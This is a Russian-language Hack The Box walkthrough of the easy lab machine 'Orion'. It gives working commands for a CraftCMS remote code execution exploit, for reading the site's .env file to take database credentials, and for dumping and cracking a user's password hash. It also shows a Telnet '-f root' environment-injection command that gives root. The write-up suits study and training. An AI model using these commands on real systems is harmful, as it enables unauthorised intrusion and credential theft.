# Orion — HTB Easy

**Autor:** 0xE1P  
**Platform:** HTB  
**Difficulty:** Easy  
**OS:** Kali Linux  
**Date:** 03.09.2026  

---

## 📌 Executive Summary

Машина была скомпрометирована через RCE в CraftCMS (CVE-2025-32432), затем через чтение .env были получены пароли MySQL и далее SSH доступ пользователя adam. Повышение привилегий выполнено через уязвимость в Telnet (CVE-2026-24061).

---

## 📊 Findings / Vulnerabilities

| Уязвимость | CVE | Использование |
| :--- | :--- | :--- |
| CraftCMS Pre-Auth RCE | CVE-2025-32432 | Выполнение команд через exploit.py |
| Telnet Environment Injection | CVE-2026-24061 | env USER='-f root' telnet -a 127.0.0.1 |

---

## 🔍 Reconnaissance

### Nmap Scan

``bash
nmap -sC -sV -p- 10.129.93.166
Port	Service	Version
22/tcp	SSH	OpenSSH 8.9p1
80/tcp	HTTP	nginx 1.18.0
🌐 Web — CraftCMS RCE
На странице /admin/login определена версия CraftCMS 5.6.16.

Используем публичный эксплойт:

``bash
python3 exploit.py -u http://orion.htb -c "id"
Результат:

text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
---
##🗄️ MySQL — пароль из .env
Через тот же эксплойт читаем .env:

``bash
python3 exploit.py -u http://orion.htb -c "cat /var/www/html/craft/.env"
Найден пароль:

text
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
---
Подключаемся к MySQL и извлекаем хеш пароля пользователя adam:

``bash
python3 exploit.py -u http://orion.htb -c "mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'SELECT password FROM users;'"
Хеш взломан через John/Hashcat → darkangel.
---
##🔑 SSH — доступ как adam
``bash
ssh adam@10.129.93.166
Password: darkangel
---
##🔐 Privilege Escalation — Telnet CVE-2026-24061
Проверяем локальные порты:

``bash
netstat -tulpn | grep 23
Результат:

text
tcp  0  0 127.0.0.1:23  0.0.0.0:*  LISTEN
---
Эксплуатируем:

``bash
env USER='-f root' telnet -a 127.0.0.1
---
##🏁 Flags
``bash
cat /home/adam/user.txt
cat /root/root.txt
###📎 All Commands
`bash
nmap -sC -sV -p- 10.129.93.166
python3 exploit.py -u http://orion.htb -c "id"
python3 exploit.py -u http://orion.htb -c "cat /var/www/html/craft/.env"
python3 exploit.py -u http://orion.htb -c "mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'SELECT password FROM users;'"
ssh adam@10.129.93.166
netstat -tulpn | grep 23
env USER='-f root' telnet -a 127.0.0.1
cat /home/adam/user.txt
cat /root/root.txt
